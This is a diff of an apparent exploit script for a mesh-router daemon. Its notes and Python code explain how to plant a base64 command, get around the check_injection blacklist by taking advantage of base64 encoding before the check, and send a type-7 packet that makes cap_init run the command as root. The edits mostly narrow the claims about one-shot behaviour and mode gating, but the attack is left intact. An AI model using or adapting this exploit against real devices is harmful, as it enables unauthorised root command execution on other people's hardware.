@@ -17,9 +17,11 @@ mimesh_init's eval:
 Constraints (CAP/LAN path):
   * The plant is 19 bytes. After the 10-byte "a a a a a " pad, ~8 base64 chars fit
     -> ~6 raw bytes incl. backticks -> a ~4-character command. This is a genuine
-    but tightly-budgeted one-shot; longer commands need the RE/WAN path (uncapped).
-  * ONE-SHOT: the first successful cap_init sets NETMODE=whc_cap (persisted), which
-    gates the sink until the device is reset. Re-run needs a factory reset.
+    but tightly-budgeted gate-open primitive. The RE/WAN candidate has a larger
+    measured budget but has not been stitched end-to-end on hardware.
+  * A completed cap_init can set NETMODE=whc_cap and close the sink. Normal web
+    setup can set the same mode without a prior exploit. Treat the trigger as
+    potentially one-shot and check the mode before using it.
   * The C blacklist (check_injection, 0xe2c9) is bypassed structurally: cab_meshd
     base64-encodes the field before checking, so the blacklist only sees base64.
 
@@ -112,17 +114,17 @@ def run(host, port, ident, b64cmd, timeout, hold):
     except (socket.timeout, ssl.SSLWantReadError, OSError):
         pass
 
-    # 3) type-7 -> cap_init -> base64 -d -> mimesh_init eval (runs the command as root)
+    # 3) type-7 -> cap_init; the eval runs only if the CAP mode gate is open.
     b7 = bytearray(0x110)
     b7[0] = 1
     s.sendall(hdr(7, len(b7)) + bytes(b7))
-    log("[+] type-7 trigger sent -> cap_init -> eval (command runs as root)")
+    log("[+] type-7 trigger sent -> cap_init (eval requires a gate-open mode)")
     time.sleep(hold)
     try:
         s.close()
     except OSError:
         pass
-    log("[*] done  (one-shot: cap_init has now set NETMODE=whc_cap; reset to re-arm)")
+    log("[*] done  (cap_init may have changed NETMODE; check before any rerun)")
 
 
 def main():
